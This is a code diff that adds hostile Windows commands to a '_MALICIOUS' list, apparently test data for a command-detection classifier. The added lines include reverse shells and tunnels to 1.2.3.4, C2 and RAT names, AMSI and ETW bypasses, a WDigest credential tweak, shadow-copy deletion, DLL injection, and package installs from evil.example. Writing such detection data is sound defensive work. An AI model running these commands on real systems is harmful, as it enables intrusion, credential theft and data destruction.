@@ -100,6 +100,34 @@ _MALICIOUS = [
     "icacls c:\\data /grant everyone:f",
     "powershell -w hidden -c frombase64string('ZgBv')",
     "attrib +h +s c:\\evil.exe",
+    # backconnect / tunneling / C2 / RAT
+    "powershell $c=new-object net.sockets.tcpclient('1.2.3.4',443);$s=$c.getstream()",
+    "powercat -c 1.2.3.4 -p 443 -e cmd.exe",
+    "ncat.exe -e cmd.exe 1.2.3.4 4444",
+    "netsh interface portproxy add v4tov4 listenport=3389 connectaddress=1.2.3.4",
+    "frpc.exe -c frpc.ini",
+    "revsocks -connect 1.2.3.4:443 -pass x",
+    "poshc2 payload",
+    "nimplant beacon",
+    "koadic stager",
+    "brute ratel badger",
+    "pupy connect",
+    "asyncrat client",
+    # defense evasion / cred access
+    "powershell [ref].assembly.gettype('...amsiutils')",
+    "powershell etweventwrite patch",
+    "reg add hklm\\system\\currentcontrolset\\control\\securityproviders\\wdigest /v uselogoncredential /t reg_dword /d 1",
+    "wmic shadowcopy delete /nointeractive",
+    "get-wmiobject win32_shadowcopy | remove-wmiobject",
+    "mavinject.exe 1234 /injectrunning c:\\evil.dll",
+    "certoc.exe -loaddll c:\\evil.dll",
+    "conhost.exe --headless powershell -enc ZgBv",
+    "nslookup -type=txt evil.example",
+    # supply chain / git
+    "npm install https://evil.example/pkg.tgz",
+    "pip install git+http://evil.example/pkg.git",
+    "git clone http://1.2.3.4/repo.git",
+    "git config core.hookspath c:\\temp\\hooks",
 ]
 
 _BENIGN = [
